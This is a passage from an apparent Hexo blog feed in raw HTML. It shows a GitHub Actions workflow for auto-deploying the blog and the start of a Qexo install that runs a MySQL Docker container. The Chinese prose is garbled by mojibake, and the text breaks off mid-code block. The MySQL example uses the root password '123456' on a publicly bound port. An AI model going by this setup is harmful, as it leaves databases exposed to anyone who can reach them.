class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">è‡ªåŠ¨éƒ¨ç½²</span><br><br><span class="hljs-comment"># å½“æœ‰æ”¹åŠ¨æ¨é€åˆ°masteråˆ†æ”¯æ—¶ï¼Œå¯åŠ¨Action</span><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span> <span class="hljs-comment">#2020å¹´10æœˆågithubæ–°å»ºä»“åº“é»˜è®¤åˆ†æ”¯æ”¹ä¸ºmainï¼Œæ³¨æ„æ›´æ”¹</span><br>  <span class="hljs-attr">release:</span><br>    <span class="hljs-attr">types:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">published</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">deploy:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span> <span class="hljs-comment"># ä»»åŠ¡æ‰€éœ€å®¹å™¨ï¼Œå¯é€‰å€¼ï¼šubuntu-latestã€windows-latestã€macos-latest</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">æ£€æŸ¥åˆ†æ”¯</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">ref:</span> <span class="hljs-string">master</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…</span> <span class="hljs-string">Node</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">&quot;16.x&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string">          npm install hexo-cli -g</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ç¼“å­˜</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-string">cache-npm</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/cache@v3</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">cache-name:</span> <span class="hljs-string">cache-node-modules</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">node_modules</span><br>          <span class="hljs-attr">key:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">runner.os</span> <span class="hljs-string">&#125;&#125;-build-$&#123;&#123;</span> <span class="hljs-string">env.cache-name</span> <span class="hljs-string">&#125;&#125;-$&#123;&#123;</span> <span class="hljs-string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="hljs-string">&#125;&#125;</span><br>          <span class="hljs-attr">restore-keys:</span> <span class="hljs-string">|</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…ä¾èµ–</span><br>        <span class="hljs-attr">if:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">steps.cache-npm.outputs.cache-hit</span> <span class="hljs-type">!=</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install gulp-cli -g #å…¨å±€å®‰è£…gulp</span><br><span class="hljs-string">          npm install --save</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ç”Ÿæˆé™æ€æ–‡ä»¶</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo bangumi -u #bilibiliç•ªå‰§æ›´æ–°</span><br><span class="hljs-string">          hexo generate</span><br><span class="hljs-string"></span>          <br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">éƒ¨ç½²åˆ°Github</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@v4</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">token:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.GITHUBTOKEN</span> <span class="hljs-string">&#125;&#125;</span><br>          <span class="hljs-attr">repository-name:</span> <span class="hljs-string">ningan123/ningan123.github.io</span><br>          <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br>          <span class="hljs-attr">folder:</span> <span class="hljs-string">public</span><br>          <span class="hljs-attr">commit-message:</span> <span class="hljs-string">&quot;$<span class="hljs-template-variable">&#123;&#123; github.event.head_commit.message &#125;&#125;</span> $(date +\&quot;%Z %Y-%m-%d %A %H:%M:%S\&quot;) Updated By Github Actions&quot;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">git <span class="hljs-keyword">add</span> .\.github\workflows\autodeply.yaml<br>git commit -m <span class="hljs-string">&quot;add autodeply&quot;</span><br>git <span class="hljs-keyword">push</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102143921.png" alt="image.png"></p><p>é‡æ–°ç”Ÿæˆäº†tokenä¹Ÿä¸å¥½ä½¿ï¼Œåæ¥æ¢äº†ä¸€ä¸ªautodeploy.ymlï¼ŒæˆåŠŸæ‰§è¡Œäº†ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">è‡ªåŠ¨éƒ¨ç½²</span><br><br><span class="hljs-comment"># å½“æœ‰æ”¹åŠ¨æ¨é€åˆ°masteråˆ†æ”¯æ—¶ï¼Œå¯åŠ¨Action</span><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span> <span class="hljs-comment">#2020å¹´10æœˆågithubæ–°å»ºä»“åº“é»˜è®¤åˆ†æ”¯æ”¹ä¸ºmainï¼Œæ³¨æ„æ›´æ”¹</span><br>  <span class="hljs-attr">release:</span><br>    <span class="hljs-attr">types:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">published</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">deploy:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span> <span class="hljs-comment"># ä»»åŠ¡æ‰€éœ€å®¹å™¨ï¼Œå¯é€‰å€¼ï¼šubuntu-latestã€windows-latestã€macos-latest</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">æ£€æŸ¥åˆ†æ”¯</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">ref:</span> <span class="hljs-string">master</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…</span> <span class="hljs-string">Node</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">&quot;16.x&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string">          npm install hexo-cli -g</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ç¼“å­˜</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-string">cache-npm</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/cache@v3</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">cache-name:</span> <span class="hljs-string">cache-node-modules</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">node_modules</span><br>          <span class="hljs-attr">key:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">runner.os</span> <span class="hljs-string">&#125;&#125;-build-$&#123;&#123;</span> <span class="hljs-string">env.cache-name</span> <span class="hljs-string">&#125;&#125;-$&#123;&#123;</span> <span class="hljs-string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="hljs-string">&#125;&#125;</span><br>          <span class="hljs-attr">restore-keys:</span> <span class="hljs-string">|</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">å®‰è£…ä¾èµ–</span><br>        <span class="hljs-attr">if:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">steps.cache-npm.outputs.cache-hit</span> <span class="hljs-type">!=</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install gulp-cli -g #å…¨å±€å®‰è£…gulp</span><br><span class="hljs-string">          npm install --save</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ç”Ÿæˆé™æ€æ–‡ä»¶</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo bangumi -u #bilibiliç•ªå‰§æ›´æ–°</span><br><span class="hljs-string">          hexo generate</span><br><span class="hljs-string"></span>          <br><br>      <span class="hljs-comment"># - name: éƒ¨ç½²åˆ°Github</span><br>      <span class="hljs-comment">#   uses: JamesIves/github-pages-deploy-action@v4</span><br>      <span class="hljs-comment">#   with:</span><br>      <span class="hljs-comment">#     token: $&#123;&#123; secrets.GITHUBTOKEN &#125;&#125;</span><br>      <span class="hljs-comment">#     repository-name: ningan123/ningan123.github.io</span><br>      <span class="hljs-comment">#     branch: main</span><br>      <span class="hljs-comment">#     folder: public</span><br>      <span class="hljs-comment">#     commit-message: &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; $(date +\&quot;%Z %Y-%m-%d %A %H:%M:%S\&quot;) Updated By Github Actions&quot;</span><br><br><br>      <span class="hljs-comment"># - name: Build and Deploy</span><br>      <span class="hljs-comment">#   # ä½¿ç”¨ä¸“é—¨éƒ¨ç½² Hexo åˆ° GitHub pages çš„ action</span><br>      <span class="hljs-comment">#   uses: Tit1e/hexo-deploy-github-pages-action@master</span><br>      <span class="hljs-comment">#   env:</span><br>      <span class="hljs-comment">#     PERSONAL_TOKEN: $&#123;&#123; secrets.GITHUBTOKEN &#125;&#125; # secret å</span><br>      <span class="hljs-comment">#     PUBLISH_REPOSITORY: ningan123/ningan123.github.io # å…¬å…±ä»“åº“ï¼Œæ ¼å¼ï¼šGitHub ç”¨æˆ·å/ä»“åº“å</span><br>      <span class="hljs-comment">#     BRANCH: main # åˆ†æ”¯ï¼Œæ ¹æ®å®é™…å¡«å†™</span><br>      <span class="hljs-comment">#     PUBLISH_DIR: ./public # éƒ¨ç½² public ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œhexo ä¸€èˆ¬éƒ½æ˜¯è¿™ä¸ªç›®å½•ï¼Œå¯æ ¹æ®å®é™…è°ƒæ•´</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">deploy</span> <span class="hljs-comment">#æ­¤å¤„master:main æŒ‡ä»æœ¬åœ°çš„masteråˆ†æ”¯æäº¤åˆ°è¿œç¨‹ä»“åº“çš„mainåˆ†æ”¯(ä¸æ˜¯åšå®¢çš„åˆ†æ”¯å†™masterå³å¯)ï¼Œè‹¥è¿œç¨‹ä»“åº“æ²¡æœ‰å¯¹åº”åˆ†æ”¯åˆ™æ–°å»ºä¸€ä¸ªã€‚å¦‚æœ‰å…¶ä»–éœ€è¦ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚æ›´æ”¹ã€‚</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string">          cd ./public</span><br><span class="hljs-string">          git init</span><br><span class="hljs-string">          git config --global user.name &#x27;$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;&#x27;</span><br><span class="hljs-string">          git config --global user.email &#x27;$&#123;&#123; secrets.GITHUBEMAIL &#125;&#125;&#x27;</span><br><span class="hljs-string">          git add .</span><br><span class="hljs-string">          git commit -m &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; $(date +&quot;%Z %Y-%m-%d %A %H:%M:%S&quot;) Updated By Github Actions&quot;</span><br><span class="hljs-string">          git push --force --quiet &quot;https://$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;:$&#123;&#123; secrets.GITHUBTOKEN &#125;&#125;@github.com/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;.github.io.git&quot; master:main  # GitHubé…ç½®</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102154805.png" alt="image.png"></p><p>github.ioé‡Œé¢ä¹Ÿå³æ—¶æ¨é€è¿‡æ¥la~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102154822.png" alt="image.png"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://isedu.top/index.php/archives/144/#menu_index_10">Github Actionè‡ªåŠ¨åŒ–éƒ¨ç½²Hexoåšå®¢å’ŒQexoç®¡ç†åå° - æ¸…~å¹½æ®‡</a></p><p><a href="https://blog.anheyu.com/posts/asdx.html">â™ª(^âˆ‡^*)æ¬¢è¿è‚¥æ¥ï¼ä½¿ç”¨ Github Action è‡ªåŠ¨éƒ¨ç½² | å®‰çŸ¥é±¼</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€hexoç³»åˆ—ã€‘04.ä½¿ç”¨qexoç®¡ç†hexo</title>
    <link href="/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9104.%E4%BD%BF%E7%94%A8qexo%E7%AE%A1%E7%90%86hexo/"/>
    <url>/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9104.%E4%BD%BF%E7%94%A8qexo%E7%AE%A1%E7%90%86hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-150-generic <span class="hljs-comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h2 id="linuxä¸‹é€šè¿‡dockerå®‰è£…mysql"><a href="#linuxä¸‹é€šè¿‡dockerå®‰è£…mysql" class="headerlink" title="linuxä¸‹é€šè¿‡dockerå®‰è£…mysql"></a>linuxä¸‹é€šè¿‡dockerå®‰è£…mysql</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan kubeconfig]<span class="hljs-comment"># docker search mysql</span><br>NAME                   DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>mysql                  MySQL is a widely used, open-source relationâ€¦   15461     [OK]       <br>mysql/mysql-server     Optimized MySQL Server Docker images. Createâ€¦   1023                 [OK]<br>bitnami/mysql          Bitnami container image <span class="hljs-keyword">for</span> MySQL               118                  [OK]<br>mysql/mysql-cluster    Experimental MySQL Cluster Docker images. Crâ€¦   100                  <br>ubuntu/mysql           MySQL open <span class="hljs-built_in">source</span> fast, stable, multi-threadâ€¦   65                   <br>circleci/mysql         MySQL is a widely used, open-source relationâ€¦   30                   <br>mysql/mysql-router     MySQL Router provides transparent routing beâ€¦   28                   <br>rapidfort/mysql        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> MySQL   26                   <br>google/mysql           MySQL server <span class="hljs-keyword">for</span> Google Compute Engine          25                   [OK]<br>cimg/mysql                                                             3                    <br>alpine/mysql           mysql client                                    3                    <br>datajoint/mysql        MySQL image pre-configured to work smoothly â€¦   2                    [OK]<br>ilios/mysql            Mysql configured <span class="hljs-keyword">for</span> running Ilios              1                    [OK]<br>mysql/mysql-operator   MySQL Operator <span class="hljs-keyword">for</span> Kubernetes                   1                    <br>jumpserver/mysql                                                       1                    <br>elestio/mysql          Mysql, verified and packaged by Elestio         1                    <br>ddev/mysql             ARM64 base images <span class="hljs-keyword">for</span> ddev-dbserver-mysql-8.â€¦   1                    <br>eclipse/mysql          Mysql 5.7, curl, rsync                          1                    [OK]<br>vitess/mysql           Lightweight image to run MySQL with Vitess      1                    <br>bitnamicharts/mysql    Bitnami Helm chart <span class="hljs-keyword">for</span> MySQL                    0                    <br>corpusops/mysql        https://github.com/corpusops/docker-images/     0                    <br>javanile/mysql         MySQL <span class="hljs-keyword">for</span> development                           0                    <br>vulhub/mysql                                                           0                    <br>docksal/mysql          MySQL service images <span class="hljs-keyword">for</span> Docksal - https://dâ€¦   0                    <br>mirantis/mysql                                                         0                    <br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># docker pull mysql</span><br>Using default tag: latest<br>latest: Pulling from library/mysql<br>eba3c26198b7: Pull complete <br>97f7c8c33abe: Pull complete <br>aa23d877fa04: Pull complete <br>a143609ddd2d: Pull complete <br>78308a3437c4: Pull complete <br>c0880e4b3737: Pull complete <br>4bab267f9ce1: Pull complete <br>e575f6d9b17a: Pull complete <br>607f86c00053: Pull complete <br>cd68caa5febe: Pull complete <br>Digest: sha256:fd8d1b4e287c49e1e35eb5a103f337111947662130eb8a3e6c3e823813f47f7d<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> mysql:latest<br>docker.io/library/mysql:latest<br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># docker run -p 3306:3306 --name qexo -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br>933dad3ceaa45cee703201fd77397affbef16e531982c8974bfdda577b8d8d36<br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># netstat -nltp |grep 3306</span><br>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      13220/docker-proxy  <br>tcp6       0      0 :::3306       <br><br></code></pre></td></tr></table></figure><h2 id="linuxä¸‹å®‰è£…qexo"><a href="#linuxä¸‹å®‰è£…qexo" class="headerlink" title="linuxä¸‹å®‰è£…qexo"></a>linuxä¸‹å®‰è£…qexo</h2><h3 id="ä¸»çº¿ï¼šå®‰è£…"><a href="#ä¸»çº¿ï¼šå®‰è£…" class="headerlink" title="ä¸»çº¿ï¼šå®‰è£…"></a>ä¸»çº¿ï¼šå®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span 